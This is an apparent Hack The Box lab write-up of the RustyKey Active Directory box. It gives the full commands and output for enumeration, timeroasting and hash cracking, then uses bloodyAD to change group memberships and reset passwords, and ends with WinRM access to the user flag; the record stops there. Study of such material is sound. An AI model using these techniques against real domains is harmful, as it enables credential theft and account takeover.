# Machine info
As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A

```python
rr.parker:8#t5HE8L!W3A
```

# Host file setup

```python
❯❯❯ sudo nxc smb 10.129.232.127 --generate-hosts-file /etc/hosts 

SMB         10.129.232.127  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
```


# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc.rustykey.htb -vv 

Nmap scan report for dc.rustykey.htb (10.129.232.127)
Host is up, received user-set (0.013s latency).
Scanned at 2026-10-17 18:59:01 BST for 10s
Not shown: 65510 closed tcp ports (conn-refused)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49678/tcp open  unknown          syn-ack
49679/tcp open  unknown          syn-ack
49680/tcp open  unknown          syn-ack
49681/tcp open  unknown          syn-ack
49684/tcp open  unknown          syn-ack
49700/tcp open  unknown          syn-ack
```

## Nmap
```python
❯❯❯ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -Pn -sT dc.rustykey.htb     
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-17 19:00 +0100
Nmap scan report for dc.rustykey.htb (10.129.232.127)
Host is up (0.014s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-18 02:00:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 20H2 (90%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Kerberos environment setup

Since NTLM is disabled, ill have to set a realm and check the system time

```python
❯❯❯ ntpdate dc.rustykey.htb                                    
2026-10-18 03:02:34.251970 (+0100) +28800.387956 +/- 0.007766 dc.rustykey.htb 10.129.232.127 s1 no-leap
CLOCK: step_systime: Operation not permitted
```

Looks like its running at +8h

```python
❯❯❯ sudo nxc smb dc.rustykey.htb --generate-krb5-file /etc/krb5.conf              
SMB         10.129.232.127  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.127  445    dc               [+] krb5 conf saved to: /etc/krb5.conf
SMB         10.129.232.127  445    dc               [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
```

Then ill also create a krb5 conf file


# SMB (445)

```python
❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
```

## Shares
```python
❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --shares
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
SMB         dc.rustykey.htb 445    dc               [*] Enumerated shares
SMB         dc.rustykey.htb 445    dc               Share           Permissions     Remark
SMB         dc.rustykey.htb 445    dc               -----           -----------     ------
SMB         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
SMB         dc.rustykey.htb 445    dc               C$                              Default share
SMB         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
SMB         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share 
SMB         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share 
```

Just default shares

## Users
```python
❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC$
Support-Computer1$
Support-Computer2$
Support-Computer3$
Support-Computer4$
Support-Computer5$
Finance-Computer1$
Finance-Computer2$
Finance-Computer3$
Finance-Computer4$
Finance-Computer5$
IT-Computer1$
IT-Computer2$
IT-Computer3$
IT-Computer4$
IT-Computer5$
rr.parker
mm.turner
bb.morgan
gg.anderson
dd.ali
ee.reed
nn.marcos
backupadmin
```

Ill use `--rid-brute` to also get machine accounts

There is also no passwords stored in user descriptions

# Timeroasting leads to account compromise

```python
 ❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k -M timeroast
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
TIMEROAST   dc.rustykey.htb 445    dc               [*] Starting Timeroasting...
TIMEROAST   dc.rustykey.htb 445    dc               1000:$sntp-ms$58e42695e13793a7ac09c2a96571fd30$1c0111e900000000000a04a34c4f434cee7ea5eff7feff4fe1b8428bffbfcd0aee7eac0cf7feda66ee7eac0cf7ff0cba
TIMEROAST   dc.rustykey.htb 445    dc               1103:$sntp-ms$b9ecbbe1fe43365209086cedcb320f70$1c0111e900000000000a04a34c4f434cee7ea5eff7e806e4e1b8428bffbfcd0aee7eac0d97e7e8b2ee7eac0d97e812a3
TIMEROAST   dc.rustykey.htb 445    dc               1104:$sntp-ms$e22c65382d88ff6ff5593d10efe5b74a$1c0111e900000000000a04a34c4f434cee7ea5eff96fdddee1b8428bffbfcd0aee7eac0d996fbdfdee7eac0d996fe99c
TIMEROAST   dc.rustykey.htb 445    dc               1105:$sntp-ms$4d3f8d25065b35f591bf560f847a7d5e$1c0111e900000000000a04a34c4f434cee7ea5eff727b11ee1b8428bffbfcd0aee7eac0d9b40280eee7eac0d9b4051ff
TIMEROAST   dc.rustykey.htb 445    dc               1106:$sntp-ms$56e030f220b985fbcbe79d6f19ce71da$1c0111e900000000000a04a34c4f434cee7ea5eff824935de1b8428bffbfcd0aee7eac0d9c3d145dee7eac0d9c3d30e2
TIMEROAST   dc.rustykey.htb 445    dc               1107:$sntp-ms$863543b1fcdd02fdd9a55a18970e2573$1c0111e900000000000a04a34c4f434cee7ea5eff8ff7596e1b8428bffbfcd0aee7eac0d9d17f18eee7eac0d9d1819d2
TIMEROAST   dc.rustykey.htb 445    dc               1118:$sntp-ms$21c5417ce9739758e1bb2755a10facc9$1c0111e900000000000a04a34c4f434cee7ea5eff83963cee1b8428bffbfcd0aee7eac0dac7298a3ee7eac0dac72c94b
TIMEROAST   dc.rustykey.htb 445    dc               1119:$sntp-ms$ffc976752793ac99eff55dc78838c595$1c0111e900000000000a04a34c4f434cee7ea5eff98e5dfce1b8428bffbfcd0aee7eac0dadc79123ee7eac0dadc7c1cb
TIMEROAST   dc.rustykey.htb 445    dc               1120:$sntp-ms$4bb96160951b16621f0b50c373983c14$1c0111e900000000000a04a34c4f434cee7ea5eff743576de1b8428bffbfcd0aee7eac0daf539ee3ee7eac0daf53c579
TIMEROAST   dc.rustykey.htb 445    dc               1121:$sntp-ms$2f14d3aab8cf9a3612d8347a87422289$1c0111e900000000000a04a34c4f434cee7ea5eff8514211e1b8428bffbfcd0aee7eac0db0618987ee7eac0db061b01e
TIMEROAST   dc.rustykey.htb 445    dc               1122:$sntp-ms$0899d0c314f856d070833104651045fd$1c0111e900000000000a04a34c4f434cee7ea5eff9ca247be1b8428bffbfcd0aee7eac0db1da5cd8ee7eac0db1da95e3
TIMEROAST   dc.rustykey.htb 445    dc               1123:$sntp-ms$09101e4d745c7ff6d6b6e4c34cc1ff3b$1c0111e900000000000a04a34c4f434cee7ea5eff6fee045e1b8428bffbfcd0aee7eac0db327aa68ee7eac0db327e6ce
TIMEROAST   dc.rustykey.htb 445    dc               1124:$sntp-ms$d663347313b12ddac598da83a9ebe137$1c0111e900000000000a04a34c4f434cee7ea5eff8103a09e1b8428bffbfcd0aee7eac0db4390936ee7eac0db4394240
TIMEROAST   dc.rustykey.htb 445    dc               1125:$sntp-ms$890ca6c9c139f7f2d3c6ac3d2b7eb415$1c0111e900000000000a04a34c4f434cee7ea5eff9ba4002e1b8428bffbfcd0aee7eac0db5e310dbee7eac0db5e349e6
TIMEROAST   dc.rustykey.htb 445    dc               1126:$sntp-ms$af472fe1eb42690da7f6d367afaf4de9$1c0111e900000000000a04a34c4f434cee7ea5eff7115d1fe1b8428bffbfcd0aee7eac0db7114247ee7eac0db7116a8b
TIMEROAST   dc.rustykey.htb 445    dc               1127:$sntp-ms$e2796824b459f246f17d6c9300da4aac$1c0111e900000000000a04a34c4f434cee7ea5eff7f5290ce1b8428bffbfcd0aee7eac0db7f50e34ee7eac0db7f53678
```

This has dumped several hashes out

```python
❯❯❯ cat timeroast.out | cut -d ':' -f 2 | tee timeroast.hash
$sntp-ms$58e42695e13793a7ac09c2a96571fd30$1c0111e900000000000a04a34c4f434cee7ea5eff7feff4fe1b8428bffbfcd0aee7eac0cf7feda66ee7eac0cf7ff0cba
$sntp-ms$b9ecbbe1fe43365209086cedcb320f70$1c0111e900000000000a04a34c4f434cee7ea5eff7e806e4e1b8428bffbfcd0aee7eac0d97e7e8b2ee7eac0d97e812a3
$sntp-ms$e22c65382d88ff6ff5593d10efe5b74a$1c0111e900000000000a04a34c4f434cee7ea5eff96fdddee1b8428bffbfcd0aee7eac0d996fbdfdee7eac0d996fe99c
$sntp-ms$4d3f8d25065b35f591bf560f847a7d5e$1c0111e900000000000a04a34c4f434cee7ea5eff727b11ee1b8428bffbfcd0aee7eac0d9b40280eee7eac0d9b4051ff
$sntp-ms$56e030f220b985fbcbe79d6f19ce71da$1c0111e900000000000a04a34c4f434cee7ea5eff824935de1b8428bffbfcd0aee7eac0d9c3d145dee7eac0d9c3d30e2
$sntp-ms$863543b1fcdd02fdd9a55a18970e2573$1c0111e900000000000a04a34c4f434cee7ea5eff8ff7596e1b8428bffbfcd0aee7eac0d9d17f18eee7eac0d9d1819d2
$sntp-ms$21c5417ce9739758e1bb2755a10facc9$1c0111e900000000000a04a34c4f434cee7ea5eff83963cee1b8428bffbfcd0aee7eac0dac7298a3ee7eac0dac72c94b
$sntp-ms$ffc976752793ac99eff55dc78838c595$1c0111e900000000000a04a34c4f434cee7ea5eff98e5dfce1b8428bffbfcd0aee7eac0dadc79123ee7eac0dadc7c1cb
$sntp-ms$4bb96160951b16621f0b50c373983c14$1c0111e900000000000a04a34c4f434cee7ea5eff743576de1b8428bffbfcd0aee7eac0daf539ee3ee7eac0daf53c579
$sntp-ms$2f14d3aab8cf9a3612d8347a87422289$1c0111e900000000000a04a34c4f434cee7ea5eff8514211e1b8428bffbfcd0aee7eac0db0618987ee7eac0db061b01e
$sntp-ms$0899d0c314f856d070833104651045fd$1c0111e900000000000a04a34c4f434cee7ea5eff9ca247be1b8428bffbfcd0aee7eac0db1da5cd8ee7eac0db1da95e3
$sntp-ms$09101e4d745c7ff6d6b6e4c34cc1ff3b$1c0111e900000000000a04a34c4f434cee7ea5eff6fee045e1b8428bffbfcd0aee7eac0db327aa68ee7eac0db327e6ce
$sntp-ms$d663347313b12ddac598da83a9ebe137$1c0111e900000000000a04a34c4f434cee7ea5eff8103a09e1b8428bffbfcd0aee7eac0db4390936ee7eac0db4394240
$sntp-ms$890ca6c9c139f7f2d3c6ac3d2b7eb415$1c0111e900000000000a04a34c4f434cee7ea5eff9ba4002e1b8428bffbfcd0aee7eac0db5e310dbee7eac0db5e349e6
$sntp-ms$af472fe1eb42690da7f6d367afaf4de9$1c0111e900000000000a04a34c4f434cee7ea5eff7115d1fe1b8428bffbfcd0aee7eac0db7114247ee7eac0db7116a8b
$sntp-ms$e2796824b459f246f17d6c9300da4aac$1c0111e900000000000a04a34c4f434cee7ea5eff7f5290ce1b8428bffbfcd0aee7eac0db7f50e34ee7eac0db7f53678
```

I placed the output into a file, then ill cut the output so they are crackable

```python
 ❯❯❯ hashcat timeroast.hash /usr/share/wordlists/rockyou.txt -m 31300
 
 $sntp-ms$890ca6c9c139f7f2d3c6ac3d2b7eb415$1c0111e900000000000a04a34c4f434cee7ea5eff9ba4002e1b8428bffbfcd0aee7eac0db5e310dbee7eac0db5e349e6:Rusty88!
```

Only one of them cracked

```python
❯❯❯ faketime -f +8h nxc ldap dc.rustykey.htb -u users.txt -p 'Rusty88!' -k --continue-on-success

...[SNIP]...

LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\IT-Computer3$:Rusty88! 
```

I have compromise the machine account `IT-Computer3$`

# Bloodhound enumeration as `it-computer3$`

![](Pasted%20image%2020261017192935.png)

I have AddSelf on the helpdesk group

# Adding `it-computer3$` to the helpdesk group

```python
❯❯❯ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'it-computer3$' -p 'Rusty88!' -k add groupMember 'helpdesk' 'it-computer3$'
Clock skew detected. Adjusting local time by 7:59:59.544453. Retrying operation.
[+] it-computer3$ added to helpdesk
```

Ill then add the computer account to the group

![](Pasted%20image%2020261019163153.png)

This group has some interesting permissions

And after looking at the protected objects group i see that group is also a member of protected users, in this group is `bb.morgan` `ee.reed` and `gg.anderson`, and all of these users are also part of remote management users as well. But with AddMember on the group i can likely remove them from protected users if i need to

# Attempting compromise of `bb.morgan` `ee.reed` and `gg.anderson`

![](Pasted%20image%2020261019163723.png)

Ill change all of their passwords!

Both `bb.morgan` and `ee.reed` give the error `KDC_ERR_ETYPE_NOSUPP` when trying to auth and `gg.anderson` shows an error suggesting the account is disabled, and checking bloodhound the account is disabled

![](Pasted%20image%2020261019164441.png)

As seen from the setup, the users arent directly part of the group, so in order to remove them i have to specify the group they are attached to

```python
❯❯❯ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'it-computer3$' -p 'Rusty88!' -k remove groupMember 'protected objects' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'     
Clock skew detected. Adjusting local time by 7:59:59.072788. Retrying operation.
[+] CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from protected objects

❯❯❯ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'it-computer3$' -p 'Rusty88!' -k remove groupMember 'protected objects' 'CN=SUPPORT,CN=USERS,DC=RUSTYKEY,DC=HTB'
Clock skew detected. Adjusting local time by 7:59:58.816041. Retrying operation.
[+] CN=SUPPORT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from protected objects
```

Now they should be removed from the group

```python
❯❯❯ faketime -f +8h nxc ldap dc.rustykey.htb -u 'bb.morgan' -p 'Password123!' -k
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\bb.morgan:Password123!
```

I can auth as `bb.morgan`

```python
❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'ee.reed' -p 'Password123!' -k 
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\ee.reed:Password123! STATUS_LOGON_TYPE_NOT_GRANTED

❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'gg.anderson' -p 'Password123!' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\gg.anderson:Password123! KDC_ERR_CLIENT_REVOKED
```

However the other two users still show errors, `gg.anderson` is failing becuause the account is disabled, but i have no privs to re enable it

`ee.reed` is more interesting since this user has not been granted logon rights, but i also cannot add them 

So at this point it looks like i can only compromise `bb.morgan` out of these users

```python
❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'bb.morgan' -p 'Password123!' -k --generate-tgt bb.morgan  
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\bb.morgan:Password123! 
SMB         dc.rustykey.htb 445    dc               [+] TGT saved to: bb.morgan.ccache
SMB         dc.rustykey.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=bb.morgan.ccache
```

I can get a TGT for this user

# Winrm access `bb.morgan`

So i still have privileges over `dd.ali` which i have not looked into yet, so if this turns out to be a dead end ill go back to that

```python
❯❯❯ export KRB5CCNAME=bb.morgan.ccache

❯❯❯ faketime -f +8h evil-winrm-py -i dc.rustykey.htb -k --no-pass
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc.rustykey.htb:5985' as 'bb.morgan@RUSTYKEY.HTB'
evil-winrm-py PS C:\Users\bb.morgan\Documents>
```

So ill login over WINRN and look around the file system

```python
evil-winrm-py PS C:\Users\bb.morgan\Desktop> dir


    Directory: C:\Users\bb.morgan\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----         6/4/2025   9:15 AM           1976 internal.pdf                                                           
-ar---       10/19/2026   4:27 PM             34 user.txt                                                               


evil-winrm-py PS C:\Users\bb.morgan\Desktop>
```

I can get the user flag, there is also an interesting pdf file which i will download










